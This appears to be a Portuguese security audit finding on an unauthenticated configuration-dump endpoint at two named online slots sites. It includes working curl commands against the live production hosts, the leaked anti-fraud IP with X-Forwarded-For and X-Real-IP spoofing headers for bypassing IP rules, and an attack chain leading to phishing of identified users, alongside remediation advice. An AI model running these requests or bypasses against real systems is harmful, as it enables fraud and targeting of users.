# 🟠 F06 — Config dump completo sem autenticação

**Severidade:** ALTA
**Endpoint:** `POST /prod-api/set/get`
**Status:** Confirmado em **2 tenants** (amizade777 e rainha777slots)

## Resumo

O endpoint `POST /prod-api/set/get` retorna a configuração completa do
sistema **sem exigir nenhum token**. Apenas o body com 3 campos
inocentes é suficiente.

## Evidência

### amizade777

```bash
curl -k 'https://ds.amizade777.com/prod-api/set/get' \
  -H 'Content-Type: application/json' \
  -d '{"appChannel":"pc","appVersion":"1.0.0","appPackageName":"com.slots.big"}'
```

Resposta: `code:200` com config completa, incluindo:

```
ipWhites: "15.229.81.27"            ← IP whitelistado (anti-fraude)
device_user_limit: 2                 ← limite de contas por device
ip_user_limit: 6                     ← limite de contas por IP
withdraw_min: 50, withdraw_step: 100
recharge_amount_max: 999999
withdraw_config.amount_day: "100.00"
withdraw_config.handle_count_day: 10000
withdraw_config.always_amount: "10000.00"
mgm_config.bind_invite_code_bonus_reward: "50"
mgm_config.recharge_bonus_reward: ["50","50","50"]
ab_condition.openFlag: true
ab_condition.playTimes: 20
service_telegram_*: "mega2support"
withdraw_pay_rate: 0
withdraw_system_rate: 600
```

### rainha777slots

Idêntico (mesma config, mesmos `ipWhites`, mesmos limites).

## Impacto

### Reconhecimento sem autenticação
Atacante baixa o blueprint financeiro completo do site sem precisar
nem cadastrar conta:

- **Quanto dá pra recarregar?** `recharge_amount_max: 999999`
- **Quanto dá pra sacar?** `withdraw_config.always_amount: 10000`
- **Quantas contas posso ter por IP?** `ip_user_limit: 6`
- **Bônus por convite?** `bind_invite_code_bonus_reward: 50`
- **Quem é VIP?** Toda a tabela de `recharge_level` exposta.

### IP whitelisting bypass

`ipWhites: "15.229.81.27"` é o IP que escapa de regras de A/B testing
e (presumivelmente) de algumas regras anti-fraude. Atacante pode usar:

```
X-Forwarded-For: 15.229.81.27
X-Real-IP: 15.229.81.27
```

E talvez bypassar regras que dependem do IP. Não confirmei se o
backend honra esses headers (testei na bateria 2 e não vimos efeito,
mas só no recharge — outros endpoints podem honrar).

### Stack discovery

A response também vaza:
- Provedores de pagamento (`pay_gateway: 1`)
- Versões de games (`forest:86ca2`, `wingo:583e2`, etc — útil pra
  procurar CVEs nos motores específicos)
- URLs de download de APKs (`url_download: http://m.amizade777.com/`)

### Combinado com F01 (token anão)

Atacante consegue:
1. (F06) Baixar config sem auth → mapear o universo
2. (F06) Descobrir `device_user_limit: 2` → criar 2 contas por device
3. (F01) Ler saldos de uids enumerados → identificar contas com saldo
4. Direcionar phishing a usuários reais identificados

## Causa raiz hipotética

O endpoint `set/get` foi feito pra ser chamado **antes** do login
(o frontend precisa saber `recharge_amount_min`, etc, pra montar a
tela inicial). Mas misturou config UI (ok) com config interna
(IP whitelist, limites operacionais, taxas).

## Recomendação

1. **Particionar a config:**
   - `set/get/public` — só campos UI (currency, idioma, valores
     mínimos arredondados, telegram público)
   - `set/get/private` — restante, exige token válido **e** valida
     scope/role
2. **Auditar quem precisa de quê:**
   - Frontend não precisa saber `withdraw_system_rate` nem `ipWhites`.
   - Mover esses campos pra config server-side only.
3. **Adicionar rate limit** no `set/get/public` (1 req por
   sessão/cookie inicial).

## Reprodução

```bash
# Sem token, sem header de auth, sem cookie
curl -s -k 'https://ds.amizade777.com/prod-api/set/get' \
  -H 'Content-Type: application/json' \
  -d '{"appChannel":"pc","appVersion":"1.0.0","appPackageName":"com.slots.big"}' \
  | python -m json.tool

# Mesmo dump no rainha777slots
curl -s -k 'https://ds.rainha777slots.com/prod-api/set/get' \
  -H 'Content-Type: application/json' \
  -d '{"appChannel":"pc","appVersion":"1.0.0","appPackageName":"com.slots.big"}' \
  | python -m json.tool
```

## Tenants confirmadamente afetados

- amizade777
- rainha777slots
- (provavelmente todos os tenants white-label da plataforma)
